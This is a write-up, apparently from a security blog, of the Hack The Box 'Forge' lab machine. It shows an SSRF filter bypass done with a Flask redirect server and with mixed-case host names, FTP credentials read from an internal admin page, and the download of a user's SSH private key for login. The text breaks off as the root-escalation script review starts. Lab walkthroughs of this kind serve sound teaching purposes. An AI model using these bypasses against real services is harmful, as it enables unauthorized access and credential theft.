+      <content:encoded><![CDATA[<p>Forge features a website that has SSRF vulnerability on its upload page. Leveraging this SSRF allows me to access the internal admin portal to obtain an FTP account. The SSRF vulnerability also exists within the admin portal, allowing me  to access the FTP server and retrieve the user&rsquo;s SSH key. As for the root part, there&rsquo;s a Python script with sudo privileges that spawns an interactive debugging session when an exception event occurs. Since the script can be run as root, it is possible to abuse the interactive debugging session to spawn a root shell.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>SSRF bypass filters</li>
+<li>Code Review</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>nmap</li>
+<li>ffuf</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Scanning TCP ports with nmap discovers 2 open ports: SSH and HTTP. There&rsquo;s also a filtered FTP service.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA nmap/default-script-forge 10.10.11.111   
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-13 10:54 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> forge.htb <span class="o">(</span>10.10.11.111<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.066s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE    SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp filtered ftp
+</span></span><span class="line"><span class="cl">22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open     http    Apache httpd 2.4.41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Gallery
+</span></span><span class="line"><span class="cl">Service Info: Host: 10.10.11.111<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.61 seconds
+</span></span></code></pre></div><p>Beside the OS and service version, the results didn&rsquo;t show any interesting details.</p>
+<p>For now, I will just add <code>forge.htb</code> to my <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.111 forge.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---forgehtb">TCP 80 - forge.htb</h3>
+<p>The main website shows a gallery of images.</p>
+<p><div class="img-container"><img src="imgs/image-20210913200846701.png" alt="image-20210913200846701"  /></div>
+</p>
+<p>Using Wapplyzer, it tells that the site is running on PHP.</p>
+<p><div class="img-container"><img src="imgs/image-20221013203144811.png" alt="image-20221013203144811"  /></div>
+</p>
+<p>There&rsquo;s an upload page at <code>/upload</code>, which allows visitors to upload a file from local disk or a URL.</p>
+<p><div class="img-container"><img src="imgs/image-20210913201318274.png" alt="image-20210913201318274"  /></div>
+</p>
+<h4 id="testing-upload">Testing Upload</h4>
+<p>On submitting a legit JPG file, it returns with a URL to access the file.</p>
+<p><div class="img-container"><img src="imgs/image-20221013210552525.png" alt="image-20221013210552525"  /></div>
+</p>
+<p>Since filenames are randomized, IDOR attack isn&rsquo;t an option here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ curl -IL http://forge.htb/uploads/nMu63RoLNdk8BoE2a7b4 
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Date: Thu, <span class="m">13</span> Sept <span class="m">2021</span> 14:06:11 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Content-Disposition: inline<span class="p">;</span> <span class="nv">filename</span><span class="o">=</span>nMu63RoLNdk8BoE2a7b4
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">51142</span>
+</span></span><span class="line"><span class="cl">Last-Modified: Thu, <span class="m">13</span> Sept <span class="m">2021</span> 14:05:20 GMT
+</span></span><span class="line"><span class="cl">Cache-Control: no-cache
+</span></span><span class="line"><span class="cl">Content-Type: image/jpg
+</span></span></code></pre></div><p>This time, I&rsquo;ll try the <strong>upload from url</strong> option. I&rsquo;ll start a Python web server listening on port 8000. On submitting, there is a request coming from Forge&rsquo;s IP.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ python3 -m http.server <span class="m">8000</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl">10.10.11.111 - - <span class="o">[</span>13/Sep/2021 09:23:38<span class="o">]</span> <span class="s2">&#34;GET /innocent.jpg HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span></code></pre></div><p>With <code>netcat</code>, I could see the detailed request where I can see that it&rsquo;s coming from the Python&rsquo;s request module. So I&rsquo;m guessing that the site is running on Python (most likely Flask).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">8000</span> 
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">8000</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.15.190<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.111<span class="o">]</span> <span class="m">43242</span>
+</span></span><span class="line"><span class="cl">GET /innocent.jpg HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.15.190:8000
+</span></span><span class="line"><span class="cl">User-Agent: python-requests/2.25.1
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">too many output retries : Broken pipe
+</span></span></code></pre></div><p>By trying to upload a non existent file path, the error output proves that it&rsquo;s using Python in the back end.</p>
+<p><div class="img-container"><img src="imgs/image-20210913203132729.png" alt="	"  /></div>
+</p>
+<p>When attempting to access <code>localhost</code> and <code>127.0.0.1</code>, the website tells that these addresses are blacklisted.</p>
+<p><div class="img-container"><img src="imgs/image-20210913203935343.png" alt=" "  /></div>
+</p>
+<p>How about FTP? Well only <code>http</code> and <code>https</code> protocols are supported here. Therefore, I can&rsquo;t touch the FTP server with this (yet).</p>
+<p><div class="img-container"><img src="imgs/image-20221013213206158.png" alt="image-20221013213206158"  /></div>
+</p>
+<h3 id="vhost-enumeration">Vhost Enumeration</h3>
+<p>Fuzzing the vhost using <code>ffuf</code> reveals an interesting subdomain: <code>admin.forge.htb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ ffuf -u http://forge.htb -H <span class="s2">&#34;Host: FUZZ.forge.htb&#34;</span> -mc <span class="m">200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v1.3.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://forge.htb
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.forge.htb
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin                   <span class="o">[</span>Status: 200, Size: 27, Words: 4, Lines: 2<span class="o">]</span>
+</span></span></code></pre></div><p>I&rsquo;ll add that domain to my <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.111 admin.forge.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span></code></pre></div><h3 id="tcp-80---adminforgehtb">TCP 80 - admin.forge.htb</h3>
+<p>Unfortunately, visiting <code>admin.forge.htb</code> shows a message that this domain is only reachable from localhost.</p>
+<p><div class="img-container"><img src="imgs/image-20210913210859484.png" alt="image-20210913210859484"  /></div>
+</p>
+<p>When trying to access this domain from the upload feature, it would return the same message about blacklisted address.</p>
+<p><div class="img-container"><img src="imgs/image-20210913212229777.png" alt="image-20210913212229777"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-user">Shell as user</h3>
+<h4 id="ssrf-bypass-with-domain-redirection">SSRF Bypass with Domain Redirection</h4>
+<p>Several SSRF bypass with number-based payload are actually works and can be used to access localhost address, but I&rsquo;ve to find domain-based bypass since the web server routes/handles <code>forge.htb</code> and <code>admin.forge.htb</code> differently (allow external access vs. internal access only).</p>
+<p>Based on the previous upload testing, the site is using Python Requests module. The <code>requests.get()</code> function is <a href="https://requests.readthedocs.io/en/latest/user/quickstart/#redirection-and-history">always follow redirection by default</a>. Knowing this, there&rsquo;s a high chance that bypassing the SSRF filter using domain redirection would work.</p>
+<p>Here&rsquo;s the strategy:</p>
+<ul>
+<li>Host a simple site redirector that always redirect any incoming request to <code>http://admin.forge.htb</code>.</li>
+<li>Submit the redirector URL on the upload page at <code>forge.htb/upload</code>.</li>
+</ul>
+<p>And here&rsquo;s the visualization of how the SSRF filter bypass using domain redirection.</p>
+<p><div class="img-container"><img src="imgs/image-20221015214529436.png" alt="image-20221015214529436"  /></div>
+</p>
+<p>I&rsquo;ll write the redirector using Flask.</p>
+<p><code>redirector.py</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;http://admin.forge.htb/&#34;</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
+</span></span></code></pre></div><p>I&rsquo;ll run the redirector with:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.13» 
+</span></span><span class="line"><span class="cl">$ python3 redirector.py
+</span></span></code></pre></div><p>After the redirector is running, I&rsquo;ll head to the upload page, intercept the upload request and change the URL value to my machine IP.</p>
+<p>On submitting the request, I see there&rsquo;s a success message in the response.</p>
+<p><div class="img-container"><img src="imgs/image-20221015112628345.png" alt="image-20221015112628345"  /></div>
+</p>
+<p>A little explanation:</p>
+<ol>
+<li>My IP is not in the blacklist address, so the site (Forge) starts making a request to it, where eventually falls in to the redirector site.</li>
+<li>Since <code>requests.get()</code> follows redirection by default, the request goes straight to the site I intended to redirect to, which is <code>admin.forge.htb</code>. It eventually bypasses the checks for blacklisted addresses.</li>
+<li>Finally, the site takes the whole <code>admin.forge.htb</code> page as a file content and uploads it to the <code>forge.htb/upload</code>. Now I can see <code>admin.forge.htb</code> page by accessing that file from the given URL.</li>
+</ol>
+<h4 id="ssrf-bypass-with-mixed-case">SSRF Bypass with Mixed Case</h4>
+<p>Another way to bypass the filters is mixing upper case and lower case on the domain name like <code>admin.forge.htB</code>:</p>
+<p><div class="img-container"><img src="imgs/image-20210913214359458.png" alt="image-20210913214359458"  /></div>
+</p>
+<p>Both bypass methods are working fine.</p>
+<p>Now with <code>curl</code>, I could see the page source of <code>admin.forge.htb</code>. There&rsquo;s two links here: <code>/announcements</code> and another <code>/upload</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.13» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/mn4G5G1B5oaF2SXMwbHH
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">    &lt;title&gt;Admin Portal&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/main.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;header&gt;
+</span></span><span class="line"><span class="cl">            &lt;nav&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">            &lt;/nav&gt;
+</span></span><span class="line"><span class="cl">    &lt;/header&gt;
+</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">    &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></div><p>Accessing <code>/announcements</code> via SSRF reveals interesting information:</p>
+<ul>
+<li>An FTP account</li>
+<li>The upload feature in this admin portal now supports FTP and upload via query string <code>u</code> (<code>/upload?u=value</code>).</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/NatO83YkYfhzkl9fG9MB
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">    &lt;title&gt;Announcements&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/main.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/announcements.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;header&gt;
+</span></span><span class="line"><span class="cl">            &lt;nav&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">            &lt;/nav&gt;
+</span></span><span class="line"><span class="cl">    &lt;/header&gt;
+</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">    &lt;ul&gt;
+</span></span><span class="line"><span class="cl">        &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;
+</span></span><span class="line"><span class="cl">        &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols <span class="k">for</span> uploading from url.&lt;/li&gt;
+</span></span><span class="line"><span class="cl">        &lt;li&gt;The /upload endpoint has been configured <span class="k">for</span> easy scripting of uploads, and <span class="k">for</span> uploading an image, one can simply pass a url with ?u<span class="o">=</span><span class="p">&amp;</span>lt<span class="p">;</span>url<span class="p">&amp;</span>gt<span class="p">;</span>.&lt;/li&gt;
+</span></span><span class="line"><span class="cl">    &lt;/ul&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></div><h4 id="ftp-access">FTP Access</h4>
+<p>From here, I can try accessing the FTP service via the upload feature on the admin portal using the same SSRF bypass technique.</p>
+<p><div class="img-container"><img src="imgs/image-20221015121407530.png" alt="image-20221015121407530"  /></div>
+</p>
+<p>It seems the FTP host the user home dir. The user flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/0c47HKRZiXNh3F5smn2z
+</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">3</span> <span class="m">1000</span>     <span class="m">1000</span>         <span class="m">4096</span> Aug <span class="m">04</span> 19:23 snap
+</span></span><span class="line"><span class="cl">-rw-r-----    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>           <span class="m">33</span> Sep <span class="m">13</span> 08:17 user.txt
+</span></span></code></pre></div><h4 id="ssh-access">SSH Access</h4>
+<p>For more stable access, I&rsquo;ll check if there&rsquo;s an SSH key:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://admin.forge.htB/upload?u=ftp://user:heightofsecurity123!@forge.htB/.ssh/
+</span></span></code></pre></div><p>It&rsquo;s there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/AC1f3sbHcufWHGGTVpIG 
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>          <span class="m">564</span> May <span class="m">31</span> 12:35 authorized_keys
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>         <span class="m">2590</span> May <span class="m">20</span> 08:30 id_rsa
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>          <span class="m">564</span> May <span class="m">20</span> 08:30 id_rsa.pub
+</span></span></code></pre></div><p>I&rsquo;ll grab that with</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://admin.forge.htB/upload?u=ftp://:heightofsecurity123!@forge.htB/.ssh/id_rsa
+</span></span></code></pre></div><p>And save it to my machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/hvcNBsh1xwD4c6Nyq0tP <span class="p">|</span> tee user_rsa
+</span></span><span class="line"><span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2
+</span></span><span class="line"><span class="cl"><span class="nv">shlLupso7WoS0AAAAKdXNlckBmb3JnZQE</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>Now I can SSH login as <code>user</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> user_rsa <span class="o">&amp;&amp;</span> ssh -i user_rsa user@forge.htb  
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Mon <span class="m">13</span> Sep <span class="m">2021</span> 03:12:44 PM UTC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:             <span class="m">223</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   44.5% of 6.82GB   Users logged in:       <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 26%               IPv4 address <span class="k">for</span> eth0: 10.10.11.111
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Mon Sep <span class="m">13</span> 13:30:33 <span class="m">2021</span> from 10.10.14.141
+</span></span><span class="line"><span class="cl">user@forge:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p><code>user</code> is allowed to run <code>/opt/remote-manage.py</code> as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> user on forge:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User user may run the following commands on forge:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">user@forge:~$ ls -l /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">1447</span> May <span class="m">31</span> 12:09 /opt/remote-manage.py
+</span></span></code></pre></div><h4 id="source-code-review">Source Code Review</h4>
+<p>Looking at the source code, this script is a simple tool for monitoring process, disk, and network sockets.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pdb</span>
+</span></span><span class="line"><span class="cl">
